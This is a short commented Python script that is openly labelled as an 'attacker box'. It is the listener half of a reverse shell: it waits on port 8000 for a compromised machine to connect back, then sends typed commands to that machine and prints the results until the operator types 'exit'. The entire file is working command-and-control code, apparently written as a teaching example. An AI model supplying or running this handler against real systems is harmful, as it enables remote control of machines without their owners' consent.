from socket import *

serverPort = 8000
#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
serverSocket = socket(AF_INET, SOCK_STREAM)
#make the socket more robust by allowing the operating system to reuse a socket that was recently used
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
#bind socket to the port we set but we leave the ip address blank to use the machines default IP address
serverSocket.bind(('', serverPort))
#listen for connections with 1 as the amount of connections to support
serverSocket.listen(1)
print("Attacker box listening and awaiting instructions")

#accept the connection and return a connection object which is used to send and receive commands
connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me " +str(addr))
message = connectionSocket.recv(1024)
print(message)
command = ""
#if the command is not exit
while command != "exit":
	#create the command using a prompt
	command = input("Please enter a command: ")
	#send the command encoded into binary
	connectionSocket.send(command.encode())
	#decode any response from binary into a string
	message = connectionSocket.recv(1024).decode()
	print(message)
	
#shutdown connection after running the command
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
